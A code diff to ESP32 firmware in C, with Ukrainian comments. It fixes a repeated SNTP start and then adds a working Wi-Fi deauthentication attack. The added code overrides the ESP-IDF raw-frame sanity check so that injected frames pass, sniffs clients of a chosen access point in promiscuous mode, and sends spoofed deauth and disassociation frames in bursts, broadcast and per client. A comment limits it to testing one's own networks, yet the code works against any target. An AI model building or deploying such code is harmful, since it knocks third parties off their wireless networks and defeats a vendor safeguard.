@@ -21,6 +21,7 @@ static EventGroupHandle_t s_ev;
 static volatile bool s_connected = false;
 static bool s_want_connect = false;
 static char s_ssid[33] = "";
+static portMUX_TYPE s_lock = portMUX_INITIALIZER_UNLOCKED;
 
 static void on_event(void *arg, esp_event_base_t base, int32_t id, void *data)
 {
@@ -35,8 +36,10 @@ static void on_event(void *arg, esp_event_base_t base, int32_t id, void *data)
         ESP_LOGI(TAG, "IP: " IPSTR, IP2STR(&e->ip_info.ip));
         s_connected = true;
         xEventGroupSetBits(s_ev, BIT_GOT_IP);
-        /* синхронізація часу при кожному підключенні */
-        esp_netif_sntp_start();
+        /* SNTP стартуємо лише раз: після wifi_stop()/resume() повторний старт
+           повертає ESP_ERR_INVALID_STATE (клієнт уже запущений). */
+        static bool sntp_started = false;
+        if (!sntp_started) { esp_netif_sntp_start(); sntp_started = true; }
     }
 }
 
@@ -203,6 +206,153 @@ bool netcfg_connect(const char *ssid, const char *pass, int timeout_ms)
 
 bool netcfg_is_connected(void) { return s_connected; }
 const char *netcfg_ssid(void) { return s_ssid; }
+
+/* ---------------- сирі 802.11-операції ---------------- */
+
+/* IDF блокує інʼєкцію «сирих» керуючих кадрів (deauth/disassoc): esp_wifi_80211_tx
+   викликає цю перевірку. Перевизначаємо її на «пропускати все». Символ у
+   libnet80211 сильний, тому лінкеру задано --allow-multiple-definition (див.
+   CMakeLists). Лише для авторизованого тестування власних мереж. */
+int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
+{
+    return 0;
+}
+
+static uint8_t s_atk_bssid[6];
+static uint8_t s_atk_chan;
+#define MAX_CLIENTS 16
+static uint8_t s_clients[MAX_CLIENTS][6];
+static int s_n_clients = 0;
+
+static bool mac_unicast(const uint8_t *m)
+{
+    if (m[0] & 0x01) return false;                       /* груповий/широкомовний */
+    return (m[0]|m[1]|m[2]|m[3]|m[4]|m[5]) != 0;
+}
+
+static void client_add(const uint8_t *mac)
+{
+    portENTER_CRITICAL(&s_lock);
+    for (int i = 0; i < s_n_clients; i++)
+        if (!memcmp(s_clients[i], mac, 6)) { portEXIT_CRITICAL(&s_lock); return; }
+    if (s_n_clients < MAX_CLIENTS) { memcpy(s_clients[s_n_clients++], mac, 6); }
+    portEXIT_CRITICAL(&s_lock);
+}
+
+/* promiscuous-callback: шукаємо клієнтів, що спілкуються з цільовою точкою */
+static void sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
+{
+    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
+    const wifi_promiscuous_pkt_t *p = buf;
+    const uint8_t *f = p->payload;
+    const uint8_t *a1 = f + 4, *a2 = f + 10, *a3 = f + 16;   /* dst, src, bssid */
+    if (memcmp(a3, s_atk_bssid, 6) != 0 &&
+        memcmp(a1, s_atk_bssid, 6) != 0 &&
+        memcmp(a2, s_atk_bssid, 6) != 0) return;            /* не наша точка */
+    /* клієнт — та unicast-адреса a1/a2, що не дорівнює BSSID */
+    if (mac_unicast(a1) && memcmp(a1, s_atk_bssid, 6)) client_add(a1);
+    if (mac_unicast(a2) && memcmp(a2, s_atk_bssid, 6)) client_add(a2);
+}
+
+void netcfg_raw_begin(const uint8_t bssid[6], uint8_t channel)
+{
+    s_want_connect = false;
+    esp_wifi_disconnect();
+    esp_wifi_scan_stop();
+    s_connected = false;
+
+    memcpy(s_atk_bssid, bssid, 6);
+    s_atk_chan = channel;
+    s_n_clients = 0;
+
+    esp_wifi_set_promiscuous_rx_cb(sniff_cb);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+}
+
+void netcfg_raw_end(void)
+{
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    /* повертаємося до збереженої мережі */
+    char ssid[33], pass[65];
+    if (netcfg_load(ssid, sizeof(ssid), pass, sizeof(pass))) {
+        wifi_config_t wc = {0};
+        strlcpy((char *)wc.sta.ssid, ssid, sizeof(wc.sta.ssid));
+        strlcpy((char *)wc.sta.password, pass, sizeof(wc.sta.password));
+        wc.sta.threshold.authmode = pass[0] ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN;
+        esp_wifi_set_config(WIFI_IF_STA, &wc);
+        strlcpy(s_ssid, ssid, sizeof(s_ssid));
+        s_want_connect = true;
+        esp_wifi_connect();
+    }
+}
+
+int netcfg_deauth_clients(void) { return s_n_clients; }
+
+int netcfg_client_snapshot(uint8_t out[][6], int max)
+{
+    portENTER_CRITICAL(&s_lock);
+    int n = s_n_clients < max ? s_n_clients : max;
+    memcpy(out, s_clients, n * 6);
+    portEXIT_CRITICAL(&s_lock);
+    return n;
+}
+
+/* один кадр deauth(0xC0)/disassoc(0xA0): addr1=dst, addr2=src, addr3=bssid */
+static int tx_frame(uint8_t subtype, const uint8_t *dst, const uint8_t *src)
+{
+    uint8_t frame[26] = {
+        subtype, 0x00, 0x00, 0x00,
+        0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0,
+        0x00, 0x00, 0x07, 0x00,             /* seq + reason 7 */
+    };
+    memcpy(&frame[4], dst, 6);
+    memcpy(&frame[10], src, 6);
+    memcpy(&frame[16], s_atk_bssid, 6);
+    return esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK ? 1 : 0;
+}
+
+int netcfg_deauth_one(const uint8_t client[6], int bursts)
+{
+    esp_wifi_set_channel(s_atk_chan, WIFI_SECOND_CHAN_NONE);
+    int sent = 0;
+    for (int b = 0; b < bursts; b++) {
+        sent += tx_frame(0xC0, client, s_atk_bssid);   /* точка → клієнт */
+        sent += tx_frame(0xC0, s_atk_bssid, client);   /* клієнт → точка */
+        sent += tx_frame(0xA0, client, s_atk_bssid);   /* disassoc */
+        sent += tx_frame(0xA0, s_atk_bssid, client);
+    }
+    return sent;
+}
+
+int netcfg_deauth(int bursts)
+{
+    static const uint8_t bcast[6] = { 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
+    /* залишаємось на каналі цілі (promiscuous міг зісковзнути) */
+    esp_wifi_set_channel(s_atk_chan, WIFI_SECOND_CHAN_NONE);
+
+    /* локальна копія списку клієнтів */
+    uint8_t cl[MAX_CLIENTS][6];
+    portENTER_CRITICAL(&s_lock);
+    int nc = s_n_clients;
+    memcpy(cl, s_clients, nc * 6);
+    portEXIT_CRITICAL(&s_lock);
+
+    int sent = 0;
+    for (int b = 0; b < bursts; b++) {
+        /* широкомовно (на випадок клієнтів, ще не виявлених) */
+        sent += tx_frame(0xC0, bcast, s_atk_bssid);
+        sent += tx_frame(0xA0, bcast, s_atk_bssid);
+        /* адресно кожному клієнту — в обидва боки */
+        for (int i = 0; i < nc; i++) {
+            sent += tx_frame(0xC0, cl[i], s_atk_bssid);   /* точка → клієнт */
+            sent += tx_frame(0xC0, s_atk_bssid, cl[i]);   /* клієнт → точка */
+            sent += tx_frame(0xA0, cl[i], s_atk_bssid);
+        }
+    }
+    return sent;
+}
 
 static bool s_wifi_on = true;   /* після netcfg_init радіо увімкнене */
 
